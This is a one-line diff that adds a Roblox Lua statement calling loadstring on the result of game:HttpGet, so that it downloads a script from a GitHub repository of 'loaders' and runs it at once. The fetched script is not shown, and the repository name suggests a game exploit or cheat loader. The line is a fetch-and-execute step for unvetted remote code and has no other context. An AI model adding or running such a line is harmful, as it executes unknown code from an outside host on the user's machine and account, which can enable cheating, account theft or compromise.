@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/get-a-grip-beta-spam7-0680x4c6o7sbqf.lua"))()
